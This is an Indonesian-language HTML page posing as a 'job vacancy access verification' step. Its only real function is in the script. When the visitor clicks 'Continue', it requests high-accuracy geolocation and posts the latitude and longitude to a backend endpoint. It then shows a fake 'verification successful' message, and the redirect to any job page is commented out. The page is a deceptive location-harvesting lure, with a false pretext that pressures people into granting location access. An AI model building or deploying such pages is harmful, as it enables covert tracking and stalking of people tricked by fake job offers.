<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Akses Lowongan Kerja</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Verifikasi Akses Lowongan Kerja</h2>
        <p>Silakan klik tombol di bawah untuk melanjutkan ke halaman informasi.</p>
        <button id="btnLanjut">Lanjutkan</button>
    </div>

    <script>
        document.getElementById('btnLanjut').addEventListener('click', () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    // Kirim data ke backend server
                    fetch('/api/lokasi', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ latitude: lat, longitude: lon })
                    }).then(() => {
                        // Setelah dikirim, arahkan ke halaman tujuan atau info kerja
                        alert('Verifikasi berhasil! Memuat halaman...');
                        // window.location.href = "https://google.com"; // Ganti link tujuan jika ada
                    });
                }, (error) => {
                    alert('Izin lokasi diperlukan untuk melanjutkan.');
                }, { enableHighAccuracy: true });
            } else {
                alert('Browser tidak Mendukung Geolocation.');
            }
        });
    </script>
</body>
</html>
